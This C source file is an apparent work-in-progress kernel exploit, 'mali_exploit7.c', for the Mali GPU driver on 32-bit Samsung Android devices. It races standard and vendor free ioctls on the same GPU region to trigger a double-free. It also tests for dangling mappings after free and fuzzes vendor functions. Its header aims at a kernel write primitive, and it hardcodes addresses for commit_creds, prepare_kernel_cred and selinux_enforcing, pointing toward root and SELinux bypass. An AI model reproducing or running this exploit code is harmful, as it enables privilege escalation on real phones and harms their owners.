/*
 * mali_exploit7.c — Mali vendor dispatch race condition double-free
 *
 * APPROACH: Race standard free vs vendor free on the same gpu_va
 * If both threads see the region as "live" before either marks it freed,
 * we get a double-free → slab corruption → kernel write primitive.
 *
 * Also: proper mmap via mmap2 syscall (handles 64-bit gpu_va on 32-bit)
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <unistd.h>

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0
#define SELINUX_ENFORCING   0xc0b7ad54

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16];
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int mali_alloc(int fd, uint32_t pages, uint64_t *out_gpu_va) {
    uint8_t buf[56];
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 512;
    *(uint64_t*)(buf + 8)  = pages;
    *(uint64_t*)(buf + 16) = pages;
    *(uint64_t*)(buf + 32) = 0xF;
    if (ioctl(fd, make_cmd_std(56), buf) < 0) return -1;
    if (((struct uk_header*)buf)->id != 0) return -1;
    *out_gpu_va = *(uint64_t*)(buf + 40);
    return 0;
}

/* mmap2 syscall for 32-bit ARM — handles large offsets */
static void *mali_mmap2(void *addr, size_t len, int prot, int flags,
                        int fd, unsigned long pgoff) {
    return (void *)syscall(__NR_mmap2, addr, len, prot, flags, fd, pgoff);
}

static int read_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512];
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, name)) {
            int active;
            if (sscanf(line, "%*s %d", &active) == 1) {
                fclose(f); return active;
            }
        }
    }
    fclose(f);
    return -1;
}

/* ============================================================= */
/* TEST 1: Proper mmap via mmap2                                  */
/* ============================================================= */
static void test1_mmap2(int mali_fd) {
    fprintf(stderr, "\n=== TEST 1: mmap via mmap2 syscall ===\n");

    uint64_t gpu_va;
    if (mali_alloc(mali_fd, 1, &gpu_va) < 0) {
        fprintf(stderr, "  ALLOC failed\n");
        return;
    }
    fprintf(stderr, "  gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    /* mmap2 takes page-aligned offset in 4K pages */
    unsigned long pgoff = (unsigned long)(gpu_va >> 12);
    fprintf(stderr, "  pgoff=0x%lx\n", pgoff);

    void *mapped = mali_mmap2(NULL, 4096, PROT_READ | PROT_WRITE,
                              MAP_SHARED, mali_fd, pgoff);
    if (mapped == MAP_FAILED || (long)mapped < 0) {
        fprintf(stderr, "  mmap2 failed: %s (errno=%d)\n", strerror(errno), errno);

        /* Try with MAP_PRIVATE */
        mapped = mali_mmap2(NULL, 4096, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE, mali_fd, pgoff);
        if (mapped == MAP_FAILED || (long)mapped < 0) {
            fprintf(stderr, "  MAP_PRIVATE also failed\n");

            /* Try 0 offset */
            mapped = mali_mmap2(NULL, 4096, PROT_READ | PROT_WRITE,
                                MAP_SHARED, mali_fd, 0);
            if (mapped == MAP_FAILED || (long)mapped < 0) {
                fprintf(stderr, "  offset-0 mmap also failed\n");
                return;
            }
            fprintf(stderr, "  mmap2 offset=0 at %p\n", mapped);
        }
    }

    if (mapped != MAP_FAILED && (long)mapped > 0) {
        fprintf(stderr, "  mmap2 at %p\n", mapped);
        volatile uint32_t *p = (volatile uint32_t *)mapped;
        p[0] = 0xDEADBEEF;
        fprintf(stderr, "  Write 0xDEADBEEF: read back 0x%08x\n", p[0]);

        /* Free region while mapped */
        uint8_t fbuf[16];
        memset(fbuf, 0, 16);
        ((struct uk_header*)fbuf)->id = 516;
        *(uint64_t*)(fbuf + 8) = gpu_va;
        ioctl(mali_fd, make_cmd_vendor(16), fbuf);
        fprintf(stderr, "  Vendor FREE result=%u\n", ((struct uk_header*)fbuf)->id);

        /* Read after free */
        fprintf(stderr, "  After free: 0x%08x\n", p[0]);
        if (p[0] == 0xDEADBEEF)
            fprintf(stderr, "  *** DANGLING MAPPING! ***\n");

        munmap(mapped, 4096);
    }
}

/* ============================================================= */
/* RACE CONDITION: std free vs vendor free simultaneously          */
/* ============================================================= */
struct race_args {
    int mali_fd;
    uint64_t gpu_va;
    volatile int *go;
    volatile int result;
};

static void *thread_std_free(void *arg) {
    struct race_args *a = (struct race_args *)arg;
    while (!*a->go) sched_yield();

    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = a->gpu_va;
    ioctl(a->mali_fd, make_cmd_std(16), buf);
    a->result = ((struct uk_header*)buf)->id;
    return NULL;
}

static void *thread_vendor_free(void *arg) {
    struct race_args *a = (struct race_args *)arg;
    while (!*a->go) sched_yield();

    uint8_t buf[16];
    memset(buf, 0, 16);
    ((struct uk_header*)buf)->id = 516;
    *(uint64_t*)(buf + 8) = a->gpu_va;
    ioctl(a->mali_fd, make_cmd_vendor(16), buf);
    a->result = ((struct uk_header*)buf)->id;
    return NULL;
}

static void test2_race_free(int mali_fd) {
    fprintf(stderr, "\n=== TEST 2: Race std free vs vendor free ===\n");

    int both_succeed = 0;
    int total_trials = 100;

    for (int trial = 0; trial < total_trials; trial++) {
        uint64_t gpu_va;
        if (mali_alloc(mali_fd, 1, &gpu_va) < 0) {
            fprintf(stderr, "  ALLOC failed at trial %d\n", trial);
            break;
        }

        volatile int go = 0;
        struct race_args args_std = {mali_fd, gpu_va, &go, -1};
        struct race_args args_vendor = {mali_fd, gpu_va, &go, -1};

        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread_std_free, &args_std);
        pthread_create(&t2, NULL, thread_vendor_free, &args_vendor);

        /* Small delay to let threads reach the spin loop */
        usleep(100);

        /* Release both threads simultaneously */
        go = 1;

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        if (args_std.result == 0 && args_vendor.result == 0) {
            both_succeed++;
            fprintf(stderr, "  Trial %d: BOTH SUCCEEDED (double-free!) "
                    "std=%d vendor=%d\n",
                    trial, args_std.result, args_vendor.result);
        }

        if (trial % 20 == 19) {
            fprintf(stderr, "  ... %d/%d trials, %d double-frees\n",
                    trial+1, total_trials, both_succeed);
        }
    }

    fprintf(stderr, "  Result: %d/%d double-frees\n", both_succeed, total_trials);
    if (both_succeed > 0) {
        fprintf(stderr, "  *** DOUBLE-FREE RACE CONDITION CONFIRMED! ***\n");
    }
}

/* ============================================================= */
/* RACE: Vendor free vs vendor free                               */
/* ============================================================= */
static void test3_vendor_race(int mali_fd) {
    fprintf(stderr, "\n=== TEST 3: Race vendor free vs vendor free ===\n");

    int both_succeed = 0;
    int total_trials = 100;

    for (int trial = 0; trial < total_trials; trial++) {
        uint64_t gpu_va;
        if (mali_alloc(mali_fd, 1, &gpu_va) < 0) break;

        volatile int go = 0;
        struct race_args a1 = {mali_fd, gpu_va, &go, -1};
        struct race_args a2 = {mali_fd, gpu_va, &go, -1};

        pthread_t t1, t2;
        pthread_create(&t1, NULL, thread_vendor_free, &a1);
        pthread_create(&t2, NULL, thread_vendor_free, &a2);

        usleep(100);
        go = 1;

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        if (a1.result == 0 && a2.result == 0) {
            both_succeed++;
            fprintf(stderr, "  Trial %d: DOUBLE FREE!\n", trial);
        }

        if (trial % 20 == 19)
            fprintf(stderr, "  ... %d/%d, %d hits\n",
                    trial+1, total_trials, both_succeed);
    }

    fprintf(stderr, "  Result: %d/%d double-frees\n", both_succeed, total_trials);
    if (both_succeed > 0)
        fprintf(stderr, "  *** VENDOR DOUBLE-FREE RACE CONFIRMED! ***\n");
}

/* ============================================================= */
/* RACE: alloc+mmap+free (try to get dangling mapping)            */
/* ============================================================= */
static void test4_mmap_race(int mali_fd) {
    fprintf(stderr, "\n=== TEST 4: mmap + concurrent free race ===\n");

    for (int trial = 0; trial < 20; trial++) {
        uint64_t gpu_va;
        if (mali_alloc(mali_fd, 1, &gpu_va) < 0) break;

        unsigned long pgoff = (unsigned long)(gpu_va >> 12);

        /* Try to mmap and free simultaneously */
        pid_t pid = fork();
        if (pid == 0) {
            alarm(3);
            /* Child: try mmap in a loop */
            void *m = mali_mmap2(NULL, 4096, PROT_READ | PROT_WRITE,
                                 MAP_SHARED, mali_fd, pgoff);
            if (m != MAP_FAILED && (long)m > 0) {
                volatile uint32_t *p = (volatile uint32_t *)m;
                p[0] = 0xDEADBEEF;

                /* Keep checking if our data persists after free */
                usleep(10000);  /* 10ms */
                if (p[0] == 0xDEADBEEF) {
                    fprintf(stderr, "  Trial %d: data persists after delay\n", trial);
                } else {
                    fprintf(stderr, "  Trial %d: data changed → 0x%08x\n",
                            trial, p[0]);
                }
                munmap(m, 4096);
            } else {
                fprintf(stderr, "  Trial %d: mmap failed (errno=%d)\n",
                        trial, errno);
            }
            _exit(0);
        }

        /* Parent: free after small delay */
        usleep(1000);  /* 1ms */
        uint8_t fbuf[16];
        memset(fbuf, 0, 16);
        ((struct uk_header*)fbuf)->id = 516;
        *(uint64_t*)(fbuf + 8) = gpu_va;
        ioctl(mali_fd, make_cmd_vendor(16), fbuf);

        int status;
        waitpid(pid, &status, 0);
    }
}

/* ============================================================= */
/* TEST 5: Explore Samsung-specific vendor functions 549-553      */
/* ============================================================= */
static void test5_samsung_funcs(int mali_fd) {
    fprintf(stderr, "\n=== TEST 5: Samsung-specific vendor functions ===\n");

    for (uint32_t func = 549; func <= 560; func++) {
        /* Try with increasing sizes */
        for (uint32_t size = 16; size <= 128; size += 8) {
            uint8_t buf[128];
            memset(buf, 0, 128);
            ((struct uk_header*)buf)->id = func;

            int r = ioctl(mali_fd, make_cmd_vendor(size), buf);
            uint32_t result = ((struct uk_header*)buf)->id;

            if (r >= 0 && result != 3 && result != func) {
                fprintf(stderr, "  func=%u size=%u: ioctl=%d result=%u\n",
                        func, size, r, result);
                /* Dump non-zero response bytes */
                for (int i = 8; i < (int)size; i += 4) {
                    uint32_t v = *(uint32_t*)(buf + i);
                    if (v != 0)
                        fprintf(stderr, "    [%d] = 0x%08x\n", i, v);
                }
            }
            if (r < 0 && errno != 14 && errno != 22) {
                fprintf(stderr, "  func=%u size=%u: errno=%d\n",
                        func, size, errno);
            }
        }
    }
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Race Condition & UAF Exploit ===\n");
    fprintf(stderr, "PID=%d UID=%d\n\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) {
        fprintf(stderr, "Cannot open Mali!\n");
        return 1;
    }

    if (test == 0 || test == 1) {
        pid_t pid = fork();
        if (pid == 0) { alarm(5); test1_mmap2(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 1 signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 2) {
        pid_t pid = fork();
        if (pid == 0) { alarm(30); test2_race_free(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 2 signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 3) {
        pid_t pid = fork();
        if (pid == 0) { alarm(30); test3_vendor_race(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 3 signal %d\n", WTERMSIG(status));
    }

    if (test == 4) {
        pid_t pid = fork();
        if (pid == 0) { alarm(30); test4_mmap_race(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 4 signal %d\n", WTERMSIG(status));
    }

    if (test == 0 || test == 5) {
        pid_t pid = fork();
        if (pid == 0) { alarm(10); test5_samsung_funcs(mali_fd); _exit(0); }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            fprintf(stderr, "  TEST 5 signal %d\n", WTERMSIG(status));
    }

    close(mali_fd);
    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
